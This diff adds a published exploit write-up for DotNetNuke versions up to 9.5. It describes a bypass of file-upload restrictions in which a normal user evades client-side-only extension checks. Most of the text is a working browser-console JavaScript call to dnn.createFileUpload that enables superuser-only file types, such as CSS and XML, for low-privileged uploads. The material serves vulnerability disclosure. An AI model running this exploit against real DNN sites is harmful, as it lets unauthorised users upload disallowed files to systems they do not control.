@@ -1,0 +1,70 @@
+# Exploit Title: DotNetNuke 9.5 - File Upload Restrictions Bypass
+# Date: 2020-02-23
+# Exploit Author: Sajjad Pourali
+# Vendor Homepage: http://dnnsoftware.com/
+# Software Link: https://github.com/dnnsoftware/Dnn.Platform/releases/download/v9.5.0/DNN_Platform_9.5.0_Install.zip
+# Version: <= 9.5
+# CVE : N/A
+# More Info: https://medium.com/@SajjadPourali/dnn-dotnetnuke-cms-not-as-secure-as-you-think-e8516f789175
+
+The DNN has a file upload module for superuser. As a superuser, you can upload files with the following formats — “jpg, jpeg, jpe, gif, bmp, png, svg, ttf, eot, woff, doc, docx, xls, xlsx, ppt, pptx, pdf, txt, xml, xsl, xsd, css, zip, rar, template, htmtemplate, ico, avi, mpg, mpeg, mp3, wmv, mov, wav, mp4, webm, ogv”.
+
+As a normal user you are allowed to upload files with “bmp,gif,ico,jpeg,jpg,jpe,png,svg” extensions. The same file upload module used for superuser is reused for normal users with extra validation for a few additional extensions e.g. CSS extension is not allowed.
+
+Unfortunately, only for superuser, whitelisted extension check is performed at the server end. For normal users, extra extension validation is performed at client-side only. Hence, a low privileged normal user can bypass the client-side validation and upload files with extensions which are allowed only for superuser only.
+
+For example, a normal privileged user can upload a file with extension which is allowed only for superuser, by executing the following code on a browser’s console (in the tab that manages profile’s page has opened). This attack may also be performed using proxy tools such as Burp, ZAP etc.
+
+dnn.createFileUpload({
+    "clientId": "dnn_ctr_EditUser_Profile_ProfileProperties_Photo_PhotoFileControl_FileUploadControl",
+    "moduleId": "",
+    "parentClientId": null,
+    "showOnStartup": true,
+    "folderPicker": {
+        "selectedItemCss": "selected-item",
+        "internalStateFieldId": null,
+        "disabled": false,
+        "selectItemDefaultText": "",
+        "initialState": {
+            "selectedItem": {
+                "key": "0",
+                "value": "My Folder"
+            }
+        },
+        "onSelectionChanged": []
+    },
+    "maxFileSize": 299892736,
+    "maxFiles": 0,
+    "extensions": ["jpg", "jpeg", "jpe", "gif", "bmp", "png", "svg", "ttf", "eot", "woff", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "pdf", "txt", "xml", "xsl", "xsd", "css", "zip", "rar", "template", "htmtemplate", "ico", "avi", "mpg", "mpeg", "mp3", "wmv", "mov", "wav", "mp4", "webm", "ogv"],
+    "resources": {
+        "title": "Upload Files",
+        "decompressLabel": "Decompress Zip Files",
+        "uploadToFolderLabel": "Upload To:",
+        "dragAndDropAreaTitle": "Drag files here or click to browse",
+        "uploadFileMethod": "Upload File",
+        "uploadFromWebMethod": "From URL",
+        "closeButtonText": "Close",
+        "uploadFromWebButtonText": "Upload",
+        "decompressingFile": "Decompressing File",
+        "fileIsTooLarge": "File size bigger than 286. Mb",
+        "fileUploadCancelled": "Upload cancelled",
+        "fileUploadFailed": "Upload failed",
+        "fileUploaded": "File uploaded",
+        "emptyFileUpload": "Your browser does not support empty file uploads.",
+        "fileAlreadyExists": "The file you want to upload already exists in this folder.",
+        "uploadStopped": "File upload stopped",
+        "urlTooltip": "Enter Resource URL like https://SomeWebSite.com/Images/About.png",
+        "keepButtonText": "Keep",
+        "replaceButtonText": "Replace",
+        "tooManyFiles": "You cannot upload more than {0} file(s) at once.",
+        "invalidFileExtensions": "Some selected files with invalid extensions are excluded from upload.  You can only upload files with the following extensions: bmp, gif, ico, jpeg, jpg, jpe, png, svg.",
+        "unzipFilePromptTitle": "Unzip Information",
+        "unzipFileFailedPromptBody": "<div class=\"invalidFiles\"><p>[COUNT] of [TOTAL] file(s) were not extracted because their file types are not supported:</p>[FILELIST]</div>",
+        "unzipFileSuccessPromptBody": "<div class=\"validFiles\"><p>[TOTAL] of [TOTAL] file(s) were extracted successfully.</p></div>",
+        "errorDialogTitle": "Error"
+    },
+    "width": 780,
+    "height": 630,
+    "folderPath": dnn.dnnFileUpload.settings.dnn_ctr_EditUser_Profile_ProfileProperties_Photo_PhotoFileControl_dnnFileUploadScope.folder,
+    "parameters": {}
+});
